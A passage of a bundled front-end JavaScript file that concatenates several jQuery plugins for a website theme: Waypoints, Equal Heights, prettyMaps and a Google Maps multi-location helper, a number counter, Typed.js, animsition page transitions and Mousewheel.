                var t, e = this;
                t = {
                    horizontal: {
                        newScroll: this.$element.scrollLeft(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left"
                    },
                    vertical: {
                        newScroll: this.$element.scrollTop(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up"
                    }
                };
                if (c && (!t.vertical.oldScroll || !t.vertical.newScroll)) {
                    n[m]("refresh")
                }
                n.each(t, function(t, r) {
                    var i, o, l;
                    l = [];
                    o = r.newScroll > r.oldScroll;
                    i = o ? r.forward : r.backward;
                    n.each(e.waypoints[t], function(t, e) {
                        var n, i;
                        if (r.oldScroll < (n = e.offset) && n <= r.newScroll) {
                            return l.push(e)
                        } else if (r.newScroll < (i = e.offset) && i <= r.oldScroll) {
                            return l.push(e)
                        }
                    });
                    l.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    if (!o) {
                        l.reverse()
                    }
                    return n.each(l, function(t, e) {
                        if (e.options.continuous || t === l.length - 1) {
                            return e.trigger([i])
                        }
                    })
                });
                return this.oldScroll = {
                    x: t.horizontal.newScroll,
                    y: t.vertical.newScroll
                }
            };
            t.prototype.refresh = function() {
                var t, e, r, i = this;
                r = n.isWindow(this.element);
                e = this.$element.offset();
                this.doScroll();
                t = {
                    horizontal: {
                        contextOffset: r ? 0 : e.left,
                        contextScroll: r ? 0 : this.oldScroll.x,
                        contextDimension: this.$element.width(),
                        oldScroll: this.oldScroll.x,
                        forward: "right",
                        backward: "left",
                        offsetProp: "left"
                    },
                    vertical: {
                        contextOffset: r ? 0 : e.top,
                        contextScroll: r ? 0 : this.oldScroll.y,
                        contextDimension: r ? n[m]("viewportHeight") : this.$element.height(),
                        oldScroll: this.oldScroll.y,
                        forward: "down",
                        backward: "up",
                        offsetProp: "top"
                    }
                };
                return n.each(t, function(t, e) {
                    return n.each(i.waypoints[t], function(t, r) {
                        var i, o, l, s, f;
                        i = r.options.offset;
                        l = r.offset;
                        o = n.isWindow(r.element) ? 0 : r.$element.offset()[e.offsetProp];
                        if (n.isFunction(i)) {
                            i = i.apply(r.element)
                        } else if (typeof i === "string") {
                            i = parseFloat(i);
                            if (r.options.offset.indexOf("%") > -1) {
                                i = Math.ceil(e.contextDimension * i / 100)
                            }
                        }
                        r.offset = o - e.contextOffset + e.contextScroll - i;
                        if (r.options.onlyOnScroll && l != null || !r.enabled) {
                            return
                        }
                        if (l !== null && l < (s = e.oldScroll) && s <= r.offset) {
                            return r.trigger([e.backward])
                        } else if (l !== null && l > (f = e.oldScroll) && f >= r.offset) {
                            return r.trigger([e.forward])
                        } else if (l === null && e.oldScroll >= r.offset) {
                            return r.trigger([e.forward])
                        }
                    })
                })
            };
            t.prototype.checkEmpty = function() {
                if (n.isEmptyObject(this.waypoints.horizontal) && n.isEmptyObject(this.waypoints.vertical)) {
                    this.$element.unbind([p, y].join(" "));
                    return delete a[this.id]
                }
            };
            return t
        }();
        l = function() {
            function t(t, e, r) {
                var i, o;
                r = n.extend({}, n.fn[g].defaults, r);
                if (r.offset === "bottom-in-view") {
                    r.offset = function() {
                        var t;
                        t = n[m]("viewportHeight");
                        if (!n.isWindow(e.element)) {
                            t = e.$element.height()
                        }
                        return t - n(this).outerHeight()
                    }
                }
                this.$element = t;
                this.element = t[0];
                this.axis = r.horizontal ? "horizontal" : "vertical";
                this.callback = r.handler;
                this.context = e;
                this.enabled = r.enabled;
                this.id = "waypoints" + v++;
                this.offset = null;
                this.options = r;
                e.waypoints[this.axis][this.id] = this;
                s[this.axis][this.id] = this;
                i = (o = t.data(w)) != null ? o : [];
                i.push(this.id);
                t.data(w, i)
            }
            t.prototype.trigger = function(t) {
                if (!this.enabled) {
                    return
                }
                if (this.callback != null) {
                    this.callback.apply(this.element, t)
                }
                if (this.options.triggerOnce) {
                    return this.destroy()
                }
            };
            t.prototype.disable = function() {
                return this.enabled = false
            };
            t.prototype.enable = function() {
                this.context.refresh();
                return this.enabled = true
            };
            t.prototype.destroy = function() {
                delete s[this.axis][this.id];
                delete this.context.waypoints[this.axis][this.id];
                return this.context.checkEmpty()
            };
            t.getWaypointsByElement = function(t) {
                var e, r;
                r = n(t).data(w);
                if (!r) {
                    return []
                }
                e = n.extend({}, s.horizontal, s.vertical);
                return n.map(r, function(t) {
                    return e[t]
                })
            };
            return t
        }();
        d = {
            init: function(t, e) {
                var r;
                if (e == null) {
                    e = {}
                }
                if ((r = e.handler) == null) {
                    e.handler = t
                }
                this.each(function() {
                    var t, r, i, s;
                    t = n(this);
                    i = (s = e.context) != null ? s : n.fn[g].defaults.context;
                    if (!n.isWindow(i)) {
                        i = t.closest(i)
                    }
                    i = n(i);
                    r = a[i.data(u)];
                    if (!r) {
                        r = new o(i)
                    }
                    return new l(t, r, e)
                });
                n[m]("refresh");
                return this
            },
            disable: function() {
                return d._invoke(this, "disable")
            },
            enable: function() {
                return d._invoke(this, "enable")
            },
            destroy: function() {
                return d._invoke(this, "destroy")
            },
            prev: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e > 0) {
                        return t.push(n[e - 1])
                    }
                })
            },
            next: function(t, e) {
                return d._traverse.call(this, t, e, function(t, e, n) {
                    if (e < n.length - 1) {
                        return t.push(n[e + 1])
                    }
                })
            },
            _traverse: function(t, e, i) {
                var o, l;
                if (t == null) {
                    t = "vertical"
                }
                if (e == null) {
                    e = r
                }
                l = h.aggregate(e);
                o = [];
                this.each(function() {
                    var e;
                    e = n.inArray(this, l[t]);
                    return i(o, e, l[t])
                });
                return this.pushStack(o)
            },
            _invoke: function(t, e) {
                t.each(function() {
                    var t;
                    t = l.getWaypointsByElement(this);
                    return n.each(t, function(t, n) {
                        n[e]();
                        return true
                    })
                });
                return this
            }
        };
        n.fn[g] = function() {
            var t, r;
            r = arguments[0], t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (d[r]) {
                return d[r].apply(this, t)
            } else if (n.isFunction(r)) {
                return d.init.apply(this, arguments)
            } else if (n.isPlainObject(r)) {
                return d.init.apply(this, [null, r])
            } else if (!r) {
                return n.error("jQuery Waypoints needs a callback function or handler option.")
            } else {
                return n.error("The " + r + " method does not exist in jQuery Waypoints.")
            }
        };
        n.fn[g].defaults = {
            context: r,
            continuous: true,
            enabled: true,
            horizontal: false,
            offset: 0,
            triggerOnce: false
        };
        h = {
            refresh: function() {
                return n.each(a, function(t, e) {
                    return e.refresh()
                })
            },
            viewportHeight: function() {
                var t;
                return (t = r.innerHeight) != null ? t : i.height()
            },
            aggregate: function(t) {
                var e, r, i;
                e = s;
                if (t) {
                    e = (i = a[n(t).data(u)]) != null ? i.waypoints : void 0
                }
                if (!e) {
                    return []
                }
                r = {
                    horizontal: [],
                    vertical: []
                };
                n.each(r, function(t, i) {
                    n.each(e[t], function(t, e) {
                        return i.push(e)
                    });
                    i.sort(function(t, e) {
                        return t.offset - e.offset
                    });
                    r[t] = n.map(i, function(t) {
                        return t.element
                    });
                    return r[t] = n.unique(r[t])
                });
                return r
            },
            above: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset <= t.oldScroll.y
                })
            },
            below: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "vertical", function(t, e) {
                    return e.offset > t.oldScroll.y
                })
            },
            left: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset <= t.oldScroll.x
                })
            },
            right: function(t) {
                if (t == null) {
                    t = r
                }
                return h._filter(t, "horizontal", function(t, e) {
                    return e.offset > t.oldScroll.x
                })
            },
            enable: function() {
                return h._invoke("enable")
            },
            disable: function() {
                return h._invoke("disable")
            },
            destroy: function() {
                return h._invoke("destroy")
            },
            extendFn: function(t, e) {
                return d[t] = e
            },
            _invoke: function(t) {
                var e;
                e = n.extend({}, s.vertical, s.horizontal);
                return n.each(e, function(e, n) {
                    n[t]();
                    return true
                })
            },
            _filter: function(t, e, r) {
                var i, o;
                i = a[n(t).data(u)];
                if (!i) {
                    return []
                }
                o = [];
                n.each(i.waypoints[e], function(t, e) {
                    if (r(i, e)) {
                        return o.push(e)
                    }
                });
                o.sort(function(t, e) {
                    return t.offset - e.offset
                });
                return n.map(o, function(t) {
                    return t.element
                })
            }
        };
        n[m] = function() {
            var t, n;
            n = arguments[0], t = 2 <= arguments.length ? e.call(arguments, 1) : [];
            if (h[n]) {
                return h[n].apply(null, t)
            } else {
                return h.aggregate.call(null, n)
            }
        };
        n[m].settings = {
            resizeThrottle: 100,
            scrollThrottle: 30
        };
        return i.load(function() {
            return n[m]("refresh")
        })
    })
}).call(this);

/*!
 * Simple jQuery Equal Heights
 *
 * Copyright (c) 2013 Matt Banks
 * Dual licensed under the MIT and GPL licenses.
 * Uses the same license as jQuery, see:
 * http://docs.jquery.com/License
 *
 * @version 1.5.1
 */
! function(a) {
    a.fn.equalHeights = function() {
        var b = 0,
            c = a(this);
        return c.each(function() {
            var c = a(this).innerHeight();
            c > b && (b = c)
        }), c.css("height", b)
    }, a("[data-equal]").each(function() {
        var b = a(this),
            c = b.data("equal");
        b.find(c).equalHeights()
    })
}(jQuery);

/*
 * prettyMaps 1.0.0
 *
 * Copyright 2014, Jean-Marc Goepfert - http://omgoepfert.com
 * Released under the WTFPL license - http://www.wtfpl.net/
 *
 * This version is customized and requires external elements and styles to work as expected
 *
 * Date: Sun Jan 12 18:00:00 2014 -0500
 */

(function(a) {
    function b(d, c) {
        c = c || {};
        this.defaults = {
            address: ["Melbourne, Australia"],
            zoom: 12,
            panControl: false,
            zoomControl: false,
            mapTypeControl: false,
            scaleControl: false,
            streetViewControl: false,
            overviewMapControl: false,
            scrollwheel: true,
            image: "",
            styles: [{
                stylers: [{
                    hue: c.hue
                }, {
                    saturation: c.saturation
                }, {
                    lightness: c.lightness
                }]
            }]
        };
        this.options = a.extend({}, this.defaults, c);
        if (typeof this.options.address === "string") {
            this.options.address = [this.options.address]
        }
        this.$el = a(d)
    }
    b.prototype = {
        init: function() {
            var e = this,
                g = new google.maps.Geocoder(),
                c = [],
                f;
            infowindow = new InfoBox({
                content: document.getElementById("gmap-infobox"),
                disableAutoPan: false,
                maxWidth: 150,
                pixelOffset: new google.maps.Size(-340, -100),
                zIndex: null,
                boxStyle: {
                    opacity: 1,
                    width: "280px"
                },
                closeBoxMargin: "0 0 0 0",
                closeBoxURL: "http://www.google.com/intl/en_us/mapfiles/close.gif",
                infoBoxClearance: new google.maps.Size(1, 1)
            });
            for (var d = 0; d < this.options.address.length; d++) {
                g.geocode({
                    address: this.options.address[d]
                }, function(j, i) {
                    if (i === google.maps.GeocoderStatus.OK) {
                        c.push(j);
                        if (c.length === 1) {
                            f = e.drawMap(c[c.length - 1])
                        }
                        var h = e.placeMarker(f, j)
                    }
                })
            }
        },
        drawMap: function(d) {
            var c = {
                    center: d[0].geometry.location
                },
                e = a.extend({}, this.options, c),
                f = new google.maps.Map(this.$el[0], e);
            return f
        },
        placeMarker: function(e, d) {
            var c = new google.maps.Marker({
                map: e,
                position: d[0].geometry.location,
                icon: this.options.image,
                animation: google.maps.Animation.DROP
            });
            google.maps.event.addListener(c, "click", function() {
                infowindow.open(e, this);
                e.panTo(d[0].geometry.location)
            });
            google.maps.event.addListenerOnce(e, "tilesloaded", function() {
                infowindow.open(e, c)
            })
        }
    };
    a.fn.prettyMaps = function(c) {
        if (this.length) {
            this.each(function() {
                var d = new b(this, c);
                d.init();
                a(this).data("prettyMaps", d)
            })
        }
    }
})(jQuery);

/* Multi Locations Google Maps */
(function($) {
    var d;
    var e;
    var f = [];
    var g;
    var h;

    function initialize(a, b) {
        d = new google.maps.Geocoder();
        g = new google.maps.LatLngBounds();
        h = new google.maps.InfoWindow({
            content: ''
        });
        var c = [{
            featureType: "all",
            stylers: [{
                hue: b.hue
            }, {
                saturation: b.saturation
            }, {
                lightness: b.lightness
            }]
        }];
        e = new google.maps.Map(a[0], b);
        if (typeof ozyMapData[b.dataPath] !== 'undefined') j = jQuery.parseJSON(ozyMapData[b.dataPath]);
        e.setOptions({
            styles: c
        });
        plotMarkers()
    }
    var j = [
        ['Google Official', '1600 Amphitheatre Parkway, Mountain View, USA'],
        ['Google 1', '112 S. Main St., Ann Arbor, USA'],
        ['Google 2', '10 10th Street NE, Suite 600 USA']
    ];

    function plotMarkers() {
        var i;
        for (i = 0; i < j.length; i++) {
            codeAddresses(j[i])
        }
    }

    function codeAddresses(c) {
        d.geocode({
            'address': c[1]
        }, function(a, b) {
            if (b == google.maps.GeocoderStatus.OK) {
                marker = new google.maps.Marker({
                    map: e,
                    position: a[0].geometry.location,
                    icon: c[2] ? c[2] : null,
                    animation: google.maps.Animation.DROP
                });
                google.maps.event.addListener(marker, 'click', function() {
                    h.setContent('<div id="google-maps-info-box">' + c[0] + '</div>');
                    h.open(e, this)
                });
                g.extend(a[0].geometry.location);
                f.push(marker)
            } else {
                alert("Geocode was not successful for the following reason: " + b)
            }
            e.fitBounds(g)
        })
    }
    $.fn.ozyGmap = function(a) {
        a = a || {};
        this.defaults = {
            zoom: 13,
            dataPath: null,
            panControl: false,
            zoomControl: false,
            mapTypeControl: false,
            scaleControl: false,
            streetViewControl: false,
            overviewMapControl: false,
            scrollwheel: true,
            styles: [{
                stylers: [{
                    hue: a.hue
                }, {
                    saturation: a.saturation
                }, {
                    lightness: a.lightness
                }]
            }]
        };
        if (this.length) {
            this.each(function() {
                initialize($(this), a)
            })
        }
    }
})(jQuery);

/**
 * counter
 *
 * http://stackoverflow.com/questions/2540277/jquery-counter-to-count-up-to-a-target-number
 *
 */
function ozy_formatNumber(num) {
    return num.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1,")
}
(function($) {
    $.fn.countTo = function(options) {
        // merge the default plugin settings with the custom options
        options = $.extend({}, $.fn.countTo.defaults, options || {});
        // how many times to update the value, and how much to increment the value on each update
        var loops = Math.ceil(options.speed / options.refreshInterval),
            increment = (options.to - options.from) / loops;

        return $(this).each(function() {
            var _this = this,
                loopCount = 0,
                value = options.from,
                interval = setInterval(updateTimer, options.refreshInterval);

            function updateTimer() {
                value += increment;
                loopCount++;
                if (options.sign != '' && options.signpos == 'right') {
                    $(_this).html(value.toFixed(options.decimals) + options.sign);
                } else if (options.sign != '' && options.signpos == 'left') {
                    $(_this).html(options.sign + value.toFixed(options.decimals));
                } else {
                    $(_this).html(ozy_formatNumber(value.toFixed(options.decimals)));
                }
                if (typeof(options.onUpdate) == 'function') {
                    options.onUpdate.call(_this, value);
                }
                if (loopCount >= loops) {
                    clearInterval(interval);
                    value = options.to;
                    if (typeof(options.onComplete) == 'function') {
                        options.onComplete.call(_this, value);
                    }
                }
            }
        });
    };

    $.fn.countTo.defaults = {
        from: 0, // the number the element should start at
        to: 100, // the number the element should end at
        speed: 1000, // how long it should take to count between the target numbers
        refreshInterval: 100, // how often the element should be updated
        decimals: 0, // the number of decimal places to show
        sign: '', // the sign
        signpos: 'right', //sign position, left and right available
        onUpdate: null, // callback method for every time the element is updated,
        onComplete: null, // callback method for when the element finishes updating
    };
})(jQuery);

// The MIT License (MIT)
// Typed.js | Copyright (c) 2014 Matt Boldt | www.mattboldt.com
! function(t) {
    "use strict";
    var s = function(s, e) {
        this.el = t(s), this.options = t.extend({}, t.fn.typed.defaults, e), this.isInput = this.el.is("input"), this.attr = this.options.attr, this.showCursor = this.isInput ? !1 : this.options.showCursor, this.elContent = this.attr ? this.el.attr(this.attr) : this.el.text(), this.contentType = this.options.contentType, this.typeSpeed = this.options.typeSpeed, this.startDelay = this.options.startDelay, this.backSpeed = this.options.backSpeed, this.backDelay = this.options.backDelay, this.stringsElement = this.options.stringsElement, this.strings = this.options.strings, this.strPos = 0, this.arrayPos = 0, this.stopNum = 0, this.loop = this.options.loop, this.loopCount = this.options.loopCount, this.curLoop = 0, this.stop = !1, this.cursorChar = this.options.cursorChar, this.shuffle = this.options.shuffle, this.sequence = [], this.build()
    };
    s.prototype = {
        constructor: s,
        init: function() {
            var t = this;
            t.timeout = setTimeout(function() {
                for (var s = 0; s < t.strings.length; ++s) t.sequence[s] = s;
                t.shuffle && (t.sequence = t.shuffleArray(t.sequence)), t.typewrite(t.strings[t.sequence[t.arrayPos]], t.strPos)
            }, t.startDelay)
        },
        build: function() {
            var s = this;
            if (this.showCursor === !0 && (this.cursor = t('<span class="typed-cursor">' + this.cursorChar + "</span>"), this.el.after(this.cursor)), this.stringsElement) {
                s.strings = [], this.stringsElement.hide();
                var e = this.stringsElement.find("p");
                t.each(e, function(e, i) {
                    s.strings.push(t(i).html())
                })
            }
            this.init()
        },
        typewrite: function(t, s) {
            if (this.stop !== !0) {
                var e = Math.round(70 * Math.random()) + this.typeSpeed,
                    i = this;
                i.timeout = setTimeout(function() {
                    var e = 0,
                        r = t.substr(s);
                    if ("^" === r.charAt(0)) {
                        var o = 1;
                        /^\^\d+/.test(r) && (r = /\d+/.exec(r)[0], o += r.length, e = parseInt(r)), t = t.substring(0, s) + t.substring(s + o)
                    }
                    if ("html" === i.contentType) {
                        var n = t.substr(s).charAt(0);
                        if ("<" === n || "&" === n) {
                            var a = "",
                                h = "";
                            for (h = "<" === n ? ">" : ";"; t.substr(s).charAt(0) !== h;) a += t.substr(s).charAt(0), s++;
                            s++, a += h
                        }
                    }
                    i.timeout = setTimeout(function() {
                        if (s === t.length) {
                            if (i.options.onStringTyped(i.arrayPos), i.arrayPos === i.strings.length - 1 && (i.options.callback(), i.curLoop++, i.loop === !1 || i.curLoop === i.loopCount)) return;
                            i.timeout = setTimeout(function() {
                                i.backspace(t, s)
                            }, i.backDelay)
                        } else {
                            0 === s && i.options.preStringTyped(i.arrayPos);
                            var e = t.substr(0, s + 1);
                            i.attr ? i.el.attr(i.attr, e) : i.isInput ? i.el.val(e) : "html" === i.contentType ? i.el.html(e) : i.el.text(e), s++, i.typewrite(t, s)
                        }
                    }, e)
                }, e)
            }
        },
        backspace: function(t, s) {
            if (this.stop !== !0) {
                var e = Math.round(70 * Math.random()) + this.backSpeed,
                    i = this;
                i.timeout = setTimeout(function() {
                    if ("html" === i.contentType && ">" === t.substr(s).charAt(0)) {
                        for (var e = "";
                             "<" !== t.substr(s).charAt(0);) e -= t.substr(s).charAt(0), s--;
                        s--, e += "<"
                    }
                    var r = t.substr(0, s);
                    i.attr ? i.el.attr(i.attr, r) : i.isInput ? i.el.val(r) : "html" === i.contentType ? i.el.html(r) : i.el.text(r), s > i.stopNum ? (s--, i.backspace(t, s)) : s <= i.stopNum && (i.arrayPos++, i.arrayPos === i.strings.length ? (i.arrayPos = 0, i.shuffle && (i.sequence = i.shuffleArray(i.sequence)), i.init()) : i.typewrite(i.strings[i.sequence[i.arrayPos]], s))
                }, e)
            }
        },
        shuffleArray: function(t) {
            var s, e, i = t.length;
            if (i)
                for (; --i;) e = Math.floor(Math.random() * (i + 1)), s = t[e], t[e] = t[i], t[i] = s;
            return t
        },
        reset: function() {
            var t = this;
            clearInterval(t.timeout);
            var s = this.el.attr("id");
            this.el.after('<span id="' + s + '"/>'), this.el.remove(), "undefined" != typeof this.cursor && this.cursor.remove(), t.options.resetCallback()
        }
    }, t.fn.typed = function(e) {
        return this.each(function() {
            var i = t(this),
                r = i.data("typed"),
                o = "object" == typeof e && e;
            r || i.data("typed", r = new s(this, o)), "string" == typeof e && r[e]()
        })
    }, t.fn.typed.defaults = {
        strings: ["These are the default values...", "You know what you should do?", "Use your own!", "Have a great day!"],
        stringsElement: null,
        typeSpeed: 0,
        startDelay: 0,
        backSpeed: 0,
        shuffle: !1,
        backDelay: 500,
        loop: !1,
        loopCount: !1,
        showCursor: !0,
        cursorChar: "|",
        attr: null,
        contentType: "html",
        callback: function() {},
        preStringTyped: function() {},
        onStringTyped: function() {},
        resetCallback: function() {}
    }
}(window.jQuery);

/*!
 * animsition v4.0.1
 * A simple and easy jQuery plugin for CSS animated page transitions.
 * http://blivesta.github.io/animsition
 * License : MIT
 * Author : blivesta (http://blivesta.com/)
 */
! function(t) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? module.exports = t(require("jquery")) : t(jQuery)
}(function(t) {
    "use strict";
    var n = "animsition",
        i = {
            init: function(a) {
                a = t.extend({
                    inClass: "fade-in",
                    outClass: "fade-out",
                    inDuration: 1500,
                    outDuration: 800,
                    linkElement: ".animsition-link",
                    loading: !0,
                    loadingParentElement: "body",
                    loadingClass: "animsition-loading",
                    loadingInner: "",
                    timeout: !1,
                    timeoutCountdown: 5e3,
                    onLoadEvent: !0,
                    browser: ["animation-duration", "-webkit-animation-duration"],
                    overlay: !1,
                    overlayClass: "animsition-overlay-slide",
                    overlayParentElement: "body",
                    transition: function(t) {
                        window.location.href = t
                    }
                }, a), i.settings = {
                    timer: !1,
                    data: {
                        inClass: "animsition-in-class",
                        inDuration: "animsition-in-duration",
                        outClass: "animsition-out-class",
                        outDuration: "animsition-out-duration",
                        overlay: "animsition-overlay"
                    },
                    events: {
                        inStart: "animsition.inStart",
                        inEnd: "animsition.inEnd",
                        outStart: "animsition.outStart",
                        outEnd: "animsition.outEnd"
                    }
                };
                var o = i.supportCheck.call(this, a);
                if (!o && a.browser.length > 0 && (!o || !this.length)) return "console" in window || (window.console = {}, window.console.log = function(t) {
                    return t
                }), this.length || console.log("Animsition: Element does not exist on page."), o || console.log("Animsition: Does not support this browser."), i.destroy.call(this);
                var e = i.optionCheck.call(this, a);
                return e && i.addOverlay.call(this, a), a.loading && i.addLoading.call(this, a), this.each(function() {
                    var o = this,
                        e = t(this),
                        s = t(window),
                        r = t(document),
                        l = e.data(n);
                    l || (a = t.extend({}, a), e.data(n, {
                        options: a
                    }), a.timeout && i.addTimer.call(o), a.onLoadEvent && s.on("load." + n, function() {
                        i.settings.timer && clearTimeout(i.settings.timer), i["in"].call(o)
                    }), s.on("pageshow." + n, function(t) {
                        t.originalEvent.persisted && i["in"].call(o)
                    }), s.on("unload." + n, function() {}), r.on("click." + n, a.linkElement, function(n) {
                        n.preventDefault();
                        var a = t(this),
                            e = a.attr("href");
                        2 === n.which || n.metaKey || n.shiftKey || -1 !== navigator.platform.toUpperCase().indexOf("WIN") && n.ctrlKey ? window.open(e, "_blank") : i.out.call(o, a, e)
                    }))
                })
            },
            addOverlay: function(n) {
                t(n.overlayParentElement).prepend('<div class="' + n.overlayClass + '"></div>')
            },
            addLoading: function(n) {
                t(n.loadingParentElement).append('<div class="' + n.loadingClass + '">' + n.loadingInner + "</div>")
            },
            removeLoading: function() {
                var i = t(this),
                    a = i.data(n).options,
                    o = t(a.loadingParentElement).children("." + a.loadingClass);
                o.fadeOut().remove()
            },
            addTimer: function() {
                var a = this,
                    o = t(this),
                    e = o.data(n).options;
                i.settings.timer = setTimeout(function() {
                    i["in"].call(a), t(window).off("load." + n)
                }, e.timeoutCountdown)
            },
            supportCheck: function(n) {
                var i = t(this),
                    a = n.browser,
                    o = a.length,
                    e = !1;
                0 === o && (e = !0);
                for (var s = 0; o > s; s++)
                    if ("string" == typeof i.css(a[s])) {
                        e = !0;
                        break
                    }
                return e
            },
            optionCheck: function(n) {
                var a, o = t(this);
                return a = n.overlay || o.data(i.settings.data.overlay) ? !0 : !1
            },
            animationCheck: function(i, a, o) {
                var e = t(this),
                    s = e.data(n).options,
                    r = typeof i,
                    l = !a && "number" === r,
                    d = a && "string" === r && i.length > 0;
                return l || d ? i = i : a && o ? i = s.inClass : !a && o ? i = s.inDuration : a && !o ? i = s.outClass : a || o || (i = s.outDuration), i
            },
            "in": function() {
                var a = this,
                    o = t(this),
                    e = o.data(n).options,
                    s = o.data(i.settings.data.inDuration),
                    r = o.data(i.settings.data.inClass),
                    l = i.animationCheck.call(a, s, !1, !0),
                    d = i.animationCheck.call(a, r, !0, !0),
                    u = i.optionCheck.call(a, e),
                    c = o.data(n).outClass;
                e.loading && i.removeLoading.call(a), c && o.removeClass(c), u ? i.inOverlay.call(a, d, l) : i.inDefault.call(a, d, l)
            },
            inDefault: function(n, a) {
                var o = t(this);
                o.css({
                    "animation-duration": a + "ms"
                }).addClass(n).trigger(i.settings.events.inStart).animateCallback(function() {
                    o.removeClass(n).css({
                        opacity: 1
                    }).trigger(i.settings.events.inEnd)
                })
            },
            inOverlay: function(a, o) {
                var e = t(this),
                    s = e.data(n).options;
                e.css({
                    opacity: 1
                }).trigger(i.settings.events.inStart), t(s.overlayParentElement).children("." + s.overlayClass).css({
                    "animation-duration": o + "ms"
                }).addClass(a).animateCallback(function() {
                    e.trigger(i.settings.events.inEnd)
                })
            },
            out: function(a, o) {
                var e = this,
                    s = t(this),
                    r = s.data(n).options,
                    l = a.data(i.settings.data.outClass),
                    d = s.data(i.settings.data.outClass),
                    u = a.data(i.settings.data.outDuration),
                    c = s.data(i.settings.data.outDuration),
                    m = l ? l : d,
                    g = u ? u : c,
                    f = i.animationCheck.call(e, m, !0, !1),
                    v = i.animationCheck.call(e, g, !1, !1),
                    h = i.optionCheck.call(e, r);
                s.data(n).outClass = f, h ? i.outOverlay.call(e, f, v, o) : i.outDefault.call(e, f, v, o)
            },
            outDefault: function(a, o, e) {
                var s = t(this),
                    r = s.data(n).options;
                s.css({
                    "animation-duration": o + 1 + "ms"
                }).addClass(a).trigger(i.settings.events.outStart).animateCallback(function() {
                    s.trigger(i.settings.events.outEnd), r.transition(e)
                })
            },
            outOverlay: function(a, o, e) {
                var s = this,
                    r = t(this),
                    l = r.data(n).options,
                    d = r.data(i.settings.data.inClass),
                    u = i.animationCheck.call(s, d, !0, !0);
                t(l.overlayParentElement).children("." + l.overlayClass).css({
                    "animation-duration": o + 1 + "ms"
                }).removeClass(u).addClass(a).trigger(i.settings.events.outStart).animateCallback(function() {
                    r.trigger(i.settings.events.outEnd), l.transition(e)
                })
            },
            destroy: function() {
                return this.each(function() {
                    var i = t(this);
                    t(window).off("." + n), i.css({
                        opacity: 1
                    }).removeData(n)
                })
            }
        };
    t.fn.animateCallback = function(n) {
        var i = "animationend webkitAnimationEnd";
        return this.each(function() {
            var a = t(this);
            a.on(i, function() {
                return a.off(i), n.call(this)
            })
        })
    }, t.fn.animsition = function(a) {
        return i[a] ? i[a].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof a && a ? void t.error("Method " + a + " does not exist on jQuery." + n) : i.init.apply(this, arguments)
    }
});

/*!
 * jQuery Mousewheel 3.1.13
 *
 * Copyright 2015 jQuery Foundation and other contributors
 * Released under the MIT license.
 * http://jquery.org/license
 */
! function(a) {
    "function" == typeof define && define.amd ? define(["jquery"], a) : "object" == typeof exports ? module.exports = a : a(jQuery)
}(function(a) {
    function b(b) {
        var g = b || window.event,
            h = i.call(arguments, 1),
            j = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0;
        if (b = a.event.fix(g), b.type = "mousewheel", "detail" in g && (m = -1 * g.detail), "wheelDelta" in g && (m = g.wheelDelta), "wheelDeltaY" in g && (m = g.wheelDeltaY), "wheelDeltaX" in g && (l = -1 * g.wheelDeltaX), "axis" in g && g.axis === g.HORIZONTAL_AXIS && (l = -1 * m, m = 0), j = 0 === m ? l : m, "deltaY" in g && (m = -1 * g.deltaY, j = m), "deltaX" in g && (l = g.deltaX, 0 === m && (j = -1 * l)), 0 !== m || 0 !== l) {
            if (1 === g.deltaMode) {
                var q = a.data(this, "mousewheel-line-height");
                j *= q, m *= q, l *= q
            } else if (2 === g.deltaMode) {
                var r = a.data(this, "mousewheel-page-height");
                j *= r, m *= r, l *= r
            }
            if (n = Math.max(Math.abs(m), Math.abs(l)), (!f || f > n) && (f = n, d(g, n) && (f /= 40)), d(g, n) && (j /= 40, l /= 40, m /= 40), j = Math[j >= 1 ? "floor" : "ceil"](j / f), l = Math[l >= 1 ? "floor" : "ceil"](l / f), m = Math[m >= 1 ? "floor" : "ceil"](m / f), k.settings.normalizeOffset && this.getBoundingClientRect) {
                var s = this.getBoundingClientRect();
                o = b.clientX - s.left, p = b.clientY - s.top
            }
            return b.deltaX = l, b.deltaY = m, b.deltaFactor = f, b.offsetX = o, b.offsetY = p, b.deltaMode = 0, h.unshift(b, j, l, m), e && clearTimeout(e), e = setTimeout(c, 200), (a.event.dispatch || a.event.handle).apply(this, h)
        }
    }

    function c() {
        f = null
    }

    function d(a, b) {
        return k.settings.adjustOldDeltas && "mousewheel" === a.type && b % 120 === 0
    }
    var e, f, g = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
        h = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
        i = Array.prototype.slice;
    if (a.event.fixHooks)
        for (var j = g.length; j;) a.event.fixHooks[g[--j]] = a.event.mouseHooks;
    var k = a.event.special.mousewheel = {
        version: "3.1.12",
        setup: function() {
            if (this.addEventListener)
                for (var c = h.length; c;) this.addEventListener(h[--c], b, !1);
            else this.onmousewheel = b;
            a.data(this, "mousewheel-line-height", k.getLineHeight(this)), a.data(this, "mousewheel-page-height", k.getPageHeight(this))
        },
        teardown: function() {
            if (this.removeEventListener)
                for (var c = h.length; c;) this.removeEventListener(h[--c], b, !1);
            else this.onmousewheel = null;
            a.removeData(this, "mousewheel-line-height"), a.removeData(this, "mousewheel-page-height")
        },
        getLineHeight: function(b) {
            var c = a(b),
                d = c["offsetParent" in a.fn ? "offsetParent" : "parent"]();
            return d.length || (d = a("body")), parseInt(d.css("fontSize"), 10) || parseInt(c.css("fontSize"), 10) || 16
        },
        getPageHeight: function(b) {
            return a(b).height()
        },
        settings: {
            adjustOldDeltas: !0,
            normalizeOffset: !0
        }
    };
    a.fn.extend({
        mousewheel: function(a) {
            return a ? this.bind("mousewheel", a) : this.trigger("mousewheel")
        },
        unmousewheel: function(a) {
